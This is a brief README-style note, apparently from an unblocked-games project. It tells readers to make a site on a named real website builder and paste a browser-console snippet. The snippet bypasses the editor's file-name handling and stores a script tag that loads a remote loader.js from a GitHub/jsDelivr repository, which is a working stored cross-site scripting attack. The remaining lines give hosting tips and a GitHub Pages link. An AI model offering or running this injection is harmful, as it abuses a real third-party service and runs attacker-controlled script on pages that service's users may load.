Go to https://website.nhd.org make a new site and run dis in devtools for xss!!!1!11!
```
editor.ToFileName = src => src; document.getElementById("new-page-name").value = '<script src="https://cdn.jsdelivr.net/gh/ioB-ybbolB/Blobe-Games@master/loader.js"></script>'; editor.Page.Save(this);
```
Running ``index.html`` standalone will make most games fail to load since they must be run on http:// (the same goes for data:)
If github pages aren't blocked for u just go https://ioB-ybbolB.github.io/Blobe-Games/
